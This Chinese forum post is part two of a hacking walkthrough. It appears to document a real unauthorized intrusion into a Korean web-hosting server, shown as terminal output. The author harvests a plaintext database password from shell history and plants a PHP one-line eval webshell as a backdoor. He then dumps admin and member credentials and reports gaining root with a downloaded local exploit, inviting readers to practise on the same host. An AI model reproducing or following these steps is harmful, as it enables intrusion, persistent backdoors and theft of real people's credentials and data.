@@ -1,0 +1,366 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+巧妙渗透：从注射点直接到root【下】
+D8888D主贴内容-------------------------------------------------------
+ 
+
+下面开始在终端执行命令，以进行下一步渗透：
+[jobcruit@wa64-054 ~]$ pwd
+/home/hosting_users/jobcruit
+[jobcruit@wa64-054 ~]$ ls -ls
+total 54300
+    4 drwxr-xr-x   3 jobcruit jobcruit     4096 Apr 10 09:29 021906
+40076 -rw-r--r--   1 jobcruit jobcruit 40989557 Apr 10 10:53 backup.tar.gz
+14216 -rw-r--r--   1 jobcruit jobcruit 14533068 Jun 12 04:32 jobcruit-2009-06-12.dump
+    0 -rw-r--r--   1 jobcruit jobcruit        0 Apr 10 09:33 scoreboard
+    4 drwxr-xr-x  21 jobcruit jobcruit     4096 Apr 24 17:36 www
+[jobcruit@wa64-054 ~]$ ls -la
+total 54364
+drwxr-x---    4 jobcruit jobcruit     4096 Jul 13 12:48 .
+drwx-----x  892 root     root        28672 Jul  9 17:29 ..
+drwxr-xr-x    3 jobcruit jobcruit     4096 Apr 10 09:29 021906
+-rw-r--r--    1 jobcruit jobcruit 40989557 Apr 10 10:53 backup.tar.gz
+-rw-------    1 jobcruit jobcruit     1048 Apr 24 17:37 .bash_history
+-rw-------    1 jobcruit jobcruit      358 Apr  9 07:34 .bash_profile
+-rw-r--r--    1 jobcruit jobcruit    12218 Jul 13 12:48 .ftpaccess
+-rwxr--r--    1 jobcruit jobcruit       29 Apr  9 07:34 .htaccess
+-rw-r--r--    1 jobcruit jobcruit 14533068 Jun 12 04:32 jobcruit-2009-06-12.dump
+-rw-------    1 jobcruit jobcruit      316 Apr 24 17:36 .mysql_history
+-rw-r--r--    1 jobcruit jobcruit        0 Apr 10 09:33 scoreboard
+-rw-------    1 jobcruit jobcruit      748 Apr 24 17:36 .viminfo
+drwxr-xr-x   21 jobcruit jobcruit     4096 Apr 24 17:36 www
+[jobcruit@wa64-054 ~]$ uname -a
+Linux wa64-054.cafe24.com 2.6.24.2 #1 SMP Thu Feb 14 18:00:23 KST 2008 x86_64 x86_64 x86_64 GNU/Linux
+
+2.6.24的内核，脑中反应出几个exp：vmsplice, kmod2以及近期才爆出来的几个。
+
+[jobcruit@wa64-054 ~]$ id
+uid=1680(jobcruit) gid=1680(jobcruit) groups=1680(jobcruit)
+[jobcruit@wa64-054 ~]$ w
+14:23:37 up 103 days,  9:08,  1 user,  load average: 1.02, 1.07, 1.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+jobcruit pts/0    xxx.xxx.xxx.xxx  14:21    1.00s  0.00s  0.00s sshd: jobcruit [priv]
+[jobcruit@wa64-054 new]$ uptime
+12:35:14 up 104 days,  7:20,  2 users,  load average: 0.66, 0.66, 0.95
+服务器已经连续开启104天了，很不错 ：）
+
+[jobcruit@wa64-054 ~]$ cat /etc/hosts
+# Do not remove the following line, or various programs
+# that require network functionality will fail.
+127.0.0.1               localhost.localdomain localhost
+211.196.153.105        wa64-054.cafe24.com wa64-054
+
+来看看/etc/passwd的内容，以免数据太多造成刷屏，只取前100行：
+[jobcruit@wa64-054 ~]$ head -100 /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/etc/news:
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+rpm:x:37:37::/var/lib/rpm:/sbin/nologin
+nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody:x:4294967294:4294967294:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
+smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
+pcap:x:77:77::/var/arpwatch:/sbin/nologin
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
+pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+htt:x:100:101:IIIMF Htt:/usr/lib64/im:/sbin/nologin
+mysql:x:500:500::/home/mysql:/sbin/nologin
+alias:x:501:501::/var/qmail/alias:/bin/bash
+qmaild:x:502:501::/var/qmail:/bin/bash
+qmaill:x:503:501::/var/qmail:/bin/bash
+qmailp:x:504:501::/var/qmail:/bin/bash
+qmailq:x:505:502::/var/qmail:/bin/bash
+qmailr:x:506:502::/var/qmail:/bin/bash
+qmails:x:507:502::/var/qmail:/bin/bash
+vpopmail:x:508:503::/home/vpopmail:/bin/bash
+cafe24:x:509:509::/home/cafe24:/bin/bash
+quota100:x:601:601::/tmp:/bin/false
+quota200:x:602:602::/tmp:/bin/false
+…………
+
+[jobcruit@wa64-054 ~]$ cat .htaccess
+PHP_FLAG register_globals ON
+[jobcruit@wa64-054 ~]$ head -20  .ftpaccess
+<Limit ALL>
+Allow 202.6.95.0/24
+Allow 202.14.103.0/24
+Allow 202.14.165.0/24
+Allow 202.21.0.0/21
+Allow 202.20.82.0/24
+Allow 202.20.83.0/24
+Allow 202.20.84.0/23
+Allow 202.20.86.0/24
+Allow 202.20.128.0/17
+Allow 202.20.99.0/24
+Allow 202.20.119.0/24
+Allow 202.30.0.0/15
+Allow 203.252.0.0/14
+Allow 203.248.0.0/14
+Allow 203.244.0.0/14
+Allow 203.240.0.0/14
+Allow 203.224.0.0/16
+Allow 203.236.0.0/14
+Allow 203.225.0.0/16
+[jobcruit@wa64-054 ~]$
+
+查看该用户曾经执行过的命令：
+[jobcruit@wa64-054 ~]$ cat .bash_history
+ll
+cd www
+ll
+cd backup/
+ll
+cd ..
+ll
+cd Lill
+cd ..
+ll
+cd www
+ll
+mysql -hlocalhost -ujobcruit -pjob0329 jobcruit
+mysql -hlocalhost -ujobcruit -pjob0329 jobcruit <backup20090409.sql
+ll
+chmod 777 PEG/
+ll
+cd wysiwyg/
+ll
+chmod 777 PEG
+chmod 777 PEG_temp/
+ll
+cd ..
+ll
+ll
+chmod 777 RAD/PEG/
+ll
+cd rankup_module/
+ll
+chmod 777 rankup_board/attach/
+chmod 777 rankup_board/attach/*
+ll
+cd rankup_dbback/
+ll
+chmod 777 backup_list/
+ll
+cd ..
+ll
+cd rankup_payment/
+ll
+cd inicis/
+ll
+chmod 777 log/
+ll
+cd ../../
+mysql -hlocalhost -ujobcruit -pjob0329 jobcruit
+ll
+cd ..
+ll
+cp ./Libs/_php/rankup_connection.class.php  ../
+cp ./Libs/_php/rankup_db.class.php  ../
+cd ..
+ll
+vi rankup_db.class.php
+rm rankup_db.class.php
+vi .Htaccess
+…………
+
+很好，获得了当前用户mysql的密码 ：）并且知道该用户喜欢777，不好的习惯喔！
+再来看看他在mysql里面都做过些什么：
+[jobcruit@wa64-054 ~]$ cat .mysql_history
+show tables;
+show create table rankuplog_ip;
+alter table rankuplog_ip add index content(`content`);
+alter table rankuplog_domain modify content varchar(80);
+alter table rankuplog_domain add index content(`content`);
+show tables;
+select *from rankup_admin;
+select * from rankup_admin;
+show create table rankuplog_ip;
+
+回到网站，来看看网站都有哪些子目录：
+[jobcruit@wa64-054 ~]$ cd www
+[jobcruit@wa64-054 www]$ pwd
+/home/hosting_users/jobcruit/www
+[jobcruit@wa64-054 www]$ ls -la
+total 4912
+drwxr-xr-x  21 jobcruit jobcruit    4096 Apr 24 17:36 .
+drwxr-x---   4 jobcruit jobcruit    4096 Jul 13 12:48 ..
+drwxr-xr-x   3 jobcruit jobcruit    4096 Feb 19 20:49 馆措府累诀
+drwx-----x   3 jobcruit jobcruit    4096 Nov 21  2008 arbeit
+drwx-----x   2 jobcruit jobcruit    4096 Feb 20 16:33 backup
+-rw-r--r--   1 jobcruit jobcruit 4849088 Apr  9 11:21 backup20090409.sql
+drwx-----x   2 jobcruit jobcruit    4096 Nov 21  2008 board
+-rw-r--r--   1 jobcruit jobcruit      28 Apr 24 17:36 .htaccess
+drwxr-xr-x   3 jobcruit jobcruit   36864 Jan  7  2009 images
+drwx-----x   4 jobcruit jobcruit    4096 Feb 19 23:15 include
+-rw-r--r--   1 jobcruit jobcruit    1314 Jan  8  2009 index.html
+-rw-r--r--   1 jobcruit jobcruit      17 Dec 18  2008 info.php
+drwxr-xr-x   2 jobcruit jobcruit    4096 Apr 10 10:28 ioncube
+drwx-----x   6 jobcruit jobcruit    4096 Nov 21  2008 Libs
+drwx-----x   3 jobcruit jobcruit    4096 Feb 14 17:47 main
+drwx-----x   2 jobcruit jobcruit    4096 Nov 21  2008 mypage
+drwx-----x   2 jobcruit jobcruit    4096 Nov 21  2008 pay
+drwxrwxrwx   2 jobcruit jobcruit   36864 Jul 12 15:58 PEG
+drwxr-xr-x  10 jobcruit jobcruit    4096 Feb 12 12:17 phpmyadmin
+drwx-----x   8 jobcruit jobcruit    4096 Nov 21  2008 RAD
+drwx-----x  31 jobcruit jobcruit    4096 Jan  9  2009 rankup_module
+drwx-----x   2 jobcruit jobcruit    4096 Nov 21  2008 search
+-rw-r--r--   1 jobcruit jobcruit     120 Jan  7  2009 site_working.html
+drwxr-xr-x   2 jobcruit jobcruit    4096 Jan 10  2009 web_log
+drwx-----x   4 jobcruit jobcruit    4096 Dec  5  2008 work
+drwx-----x   5 jobcruit jobcruit    4096 Nov 21  2008 wysiwyg
+[jobcruit@wa64-054 www]$ cat .htaccess
+php_flag allow_url_fopen on
+
+接下来找找jobcruit这个用户在/etc/passwd中的情况：
+[jobcruit@wa64-054 rankup_etc]$ grep "jobcruit" /etc/passwd
+jobcruit:x:1680:1680::/home/hosting_users/jobcruit:/home/bin/bash
+为了保险起见，先写个php一句话后门上去：
+[jobcruit@wa64-054 rankup_log]$ echo -e "<?php @eval(\$_POST[md5])?>" >rankuplog_time.php
+[jobcruit@wa64-054 rankup_log]$ cat rankuplog_time.php
+<?php @eval($_POST[md5])?>
+[jobcruit@wa64-054 rankup_log]$
+
+出于好奇心，进他数据库看看：
+[jobcruit@wa64-054 tmp]$ mysql -ujobcruit -p
+Enter password:
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 72106689 to server version: 4.0.22-log
+
+Type 'help;' or '\h' for help. Type '\c' to clear the buffer.
+mysql>
+mysql> show databases;
++----------+
+| Database |
++----------+
+| jobcruit |
++----------+
+1 row in set (0.01 sec)
+mysql> use jobcruit;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+Database changed
+mysql>
+mysql> show tables;
++-----------------------------------+
+| Tables_in_jobcruit                |
++-----------------------------------+
+| rankup_admin                      |
+| rankup_arbeit_employ              |
+| rankup_arbeit_employ_data         |
+| rankup_arbeit_resume              |
+| rankup_arbeit_resume_data         |
+| rankup_banner                     |
+| rankup_board_adult1               |
+| rankup_board_bbss                 |
+| rankup_board_board1               |
+| rankup_board_board11              |
+| rankup_board_board13              |
+| rankup_board_board2               |
+| rankup_board_board21              |
+| rankup_board_board22              |
+| rankup_board_boardarea            |
+| rankup_board_boarddi              |
+| rankup_board_boardjob             |
+…………
+225 rows in set (0.00 sec)
+
+来看看管理表的结构：
+mysql> describe rankup_admin;
++--------+----------+------+-----+---------+-------+
+| Field  | Type     | Null | Key | Default | Extra |
++--------+----------+------+-----+---------+-------+
+| id     | char(20) |      | PRI |         |       |
+| passwd | char(41) | YES  |     | NULL    |       |
++--------+----------+------+-----+---------+-------+
+2 rows in set (0.00 sec)
+
+再看看是否有其他管理员：
+mysql> select id,passwd from rankup_admin;
++---------+---------+
+| id      | passwd  |
++---------+---------+
+| kloveyh | job0329 |
++---------+---------+
+1 row in set (0.00 sec)
+mysql> describe rankup_member;
++--------+------------------+------+-----+---------------------+----------------+
+| Field  | Type             | Null | Key | Default             | Extra          |
++--------+------------------+------+-----+---------------------+----------------+
+| no     | int(10) unsigned |      | PRI | NULL                | auto_increment |
+| uid    | char(20)         |      | UNI |                     |                |
+| kind   | char(20)         | YES  |     | NULL                |                |
+| passwd | char(20)         |      |     |                     |                |
+| name   | char(20)         |      | MUL |                     |                |
+| open   | enum('yes','no') |      |     | yes                 |                |
+| valid  | enum('yes','no') |      |     | no                  |                |
+| wdate  | datetime         |      |     | 0000-00-00 00:00:00 |                |
+| etc01  | char(20)         | YES  |     | NULL                |                |
+| etc02  | char(20)         | YES  |     | NULL                |                |
++--------+------------------+------+-----+---------------------+----------------+
+10 rows in set (0.00 sec)
+mysql> select uid,passwd from rankup_member where no =1;
++--------+--------+
+| uid    | passwd |
++--------+--------+
+| rankup | rankup |
++--------+--------+
+1 row in set (0.00 sec)
+
+来看看有多少会员：
+mysql> select count(*) from rankup_member;
++----------+
+| count(*) |
++----------+
+|      621 |
++----------+
+1 row in set (0.00 sec)
+
+才621个，不多嘛，有些失望，不过这些会员的数据可以拿来做韩国的字典？了解韩国人的某某习惯？呵呵，利用价值就请各位看官开动脑筋了。
+好奇心也不是无限度的，下面准备提权：
+[jobcruit@wa64-054 new]$ head -100 /etc/issue
+CentOS release 4.6 (Final)
+Kernel \r on an \m
+[jobcruit@wa64-054 new]$ ifconfig
+-bash: ifconfig: command not found
+[jobcruit@wa64-054 new]$ chkconfig -list
+-bash: chkconfig: command not found
+
+权限很有限啊  ：（
+看看内核相关的包都装了哪些：
+[jobcruit@wa64-054 new]$ rpm -qa | grep kernel
+kernel-2.6.9-42.EL
+kernel-devel-2.6.9-42.0.3.EL
+kernel-smp-2.6.9-67.0.15.EL
+kernel-largesmp-devel-2.6.9-67.0.22.EL
+kernel-largesmp-devel-2.6.9-67.0.15.EL
+kernel-devel-2.6.9-67.0.22.EL
+kernel-utils-2.4-13.1.105
+kernel-smp-2.6.9-42.EL
+kernel-devel-2.6.9-42.EL
+kernel-2.6.9-42.0.3.EL
+kernel-smp-2.6.9-42.0.3.EL
+kernel-devel-2.6.9-67.0.15.EL
+kernel-smp-devel-2.6.9-67.0.15.EL
+kernel-smp-devel-2.6.9-67.0.22.EL
+kernel-smp-2.6.9-67.0.22.EL
+
+前面已经知道内核版本为2.6.24，在ping某韩国网站后发现可以外连，随即用wget下载了针对2.6.24内核以及2.6.x的所有exploit进行提权，但是均告失败 ：（
+最后在多次尝试之下终于用某个非内核local root exploit提权成功（读者可自行上去练习，注意安全），我成为了root ：） 至于下一步该做什么，比如破解root密码，安装rootkit，或是继续进行内网渗透，那就视目的而定了。
